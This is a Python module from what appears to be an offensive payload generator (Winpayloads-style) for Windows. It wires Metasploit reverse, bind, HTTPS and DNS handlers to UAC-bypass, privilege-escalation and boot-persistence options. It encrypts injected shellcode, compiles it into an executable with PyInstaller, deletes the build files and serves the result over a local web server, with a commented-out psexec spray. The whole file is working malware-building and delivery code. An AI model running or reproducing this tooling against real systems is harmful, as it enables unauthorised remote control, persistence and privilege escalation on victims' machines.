from .startmetasploit import METASPLOIT
from .main import Spinner, payloaddir, injectwindows, DoServe
from .payloadextras import EXTRAS
from .encrypt import do_Encryption
import os
import blessed
import sys
import time
import string
import random
import subprocess
import PyInstaller.__main__

t = blessed.Terminal()

METASPLOIT_Functions = {
    'reverse': {
        'uacbypass': METASPLOIT().metrev_uac,
        'allchecks': METASPLOIT().metrev_allchecks,
        'persistence': METASPLOIT().metrev_persistence,
        'normal': METASPLOIT().metrev_normal
    },
    'bind': {
        'uacbypass': METASPLOIT().metbind_uac,
        'allchecks': METASPLOIT().metbind_allchecks,
        'persistence': METASPLOIT().metbind_persistence,
        'normal': METASPLOIT().metbind_normal
    },
    'https': {
        'uacbypass': METASPLOIT().methttps_uac,
        'allchecks': METASPLOIT().methttps_allchecks,
        'persistence': METASPLOIT().methttps_persistence,
        'normal': METASPLOIT().methttps_normal
    },
    'dns': {
        'uacbypass': METASPLOIT().metdns_uac,
        'allchecks': METASPLOIT().metdns_allchecks,
        'persistence': METASPLOIT().metdns_persistence,
        'normal': METASPLOIT().metdns_normal
    },
    'nclistener': {
        'nclisten': METASPLOIT().nclisterner,
    }
}


def askAndReturnModules(shellcode, metasploit_type):
    if metasploit_type == 'nclistener':
        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])
    else:
        want_UACBYPASS = input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)?' + t.bold_red + ' y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'y':
            win7orwin10 = input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
            if not win7orwin10:
                win7orwin10 = "10"
            return (EXTRAS(shellcode).UACBYPASS(win7orwin10), METASPLOIT_Functions[metasploit_type]['uacbypass'])

        want_ALLCHECKS = input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
        if want_ALLCHECKS.lower() == 'y':
            return (EXTRAS(shellcode).ALLCHECKS(), METASPLOIT_Functions[metasploit_type]['allchecks'])

        want_PERSISTENCE = input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
        if want_PERSISTENCE.lower() == 'y':
            return (EXTRAS(shellcode).PERSISTENCE(), METASPLOIT_Functions[metasploit_type]['persistence'])

        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])


def GeneratePayload(ez2read_shellcode, payloadname, shellcode):
    from .menu import clientMenuOptions
    if len(list(clientMenuOptions.keys())) > 2:
        from .stager import clientUpload
        if clientUpload(powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}'):
            return True

    randoFileName = ''.join(random.sample(string.ascii_lowercase, 8)) + '.py'
    with open('%s/%s' % (payloaddir('cwd'), randoFileName), 'w+') as Filesave:
        Filesave.write(do_Encryption(injectwindows % (ez2read_shellcode)))
        Filesave.close()
    print('[*] Creating Payload using Pyinstaller...')
    # New version
    PyInstaller.__main__.run(['/'.join([payloaddir('cwd'), randoFileName]), '--nowindowed', '--onefile'])
    '''Old Version
    pyinstallerLocation = os.path.dirname(__file__).replace('/lib', '/winpayloads/lib/python3.12/site-packages/PyInstaller/__main__.py')
    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python37/python.exe', pyinstallerLocation,
                          '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile'], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		'''
    LOADING = Spinner('Generating Payload')
    '''
    while p.poll() is None:
        LOADING.Update()
        time.sleep(0.2)
    print('\r', end=' ')
    sys.stdout.flush()
    
    payloadstderr = p.stderr.read()
    if len(sys.argv) > 1:
        if sys.argv[1] == "-debug":
            sys.stdout.write(payloadstderr)
    try:
        os.rename('dist/%s.exe' % randoFileName, '%s/%s.exe' % (payloaddir(), randoFileName))
    except OSError:
        print(t.bold_red + "[!] Error while creating payload..." + t.normal)
        print(payloadstderr)
        return False
     '''

    print(t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal)
    CleanUpPayloadMess(randoFileName)
    DoPayloadUpload(randoFileName)
    return True


def CleanUpPayloadMess(randoFileName):
    print(payloaddir())
    os.system('rm dist -r')
    os.system('rm build -r')
    os.system('rm *.spec')
    #os.system('rm %s/%s.py' % (payloaddir(), randoFileName))


def DoPayloadUpload(payloadname):
    from .menu import returnIP
    want_to_upload = input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    #if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        #DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
    if want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
        DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt=True)
